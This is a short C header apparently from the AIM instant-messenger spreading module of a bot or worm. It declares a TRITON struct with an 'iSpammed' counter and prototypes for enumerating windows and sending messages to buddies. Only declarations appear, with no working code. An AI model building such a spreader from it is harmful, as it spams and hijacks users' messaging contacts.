
#ifndef NO_AIM

	enum {
		AIM_SENT,
		AIM_END,
		AIM_IDLE
	};

	typedef struct TRITON
	{
		int iStatus;
		char *szMsg;
		char szBuddy[256];
		unsigned int iSpammed;
	} TRITON, *PTRITON;

	int TritonMain(char*);
	DWORD WINAPI TritonMessage(LPVOID param);
	BOOL CALLBACK TritonEnum(HWND, LPARAM);
	void TritonIm(HWND, char*);
	bool TritonSetupList(HWND, bool);

#endif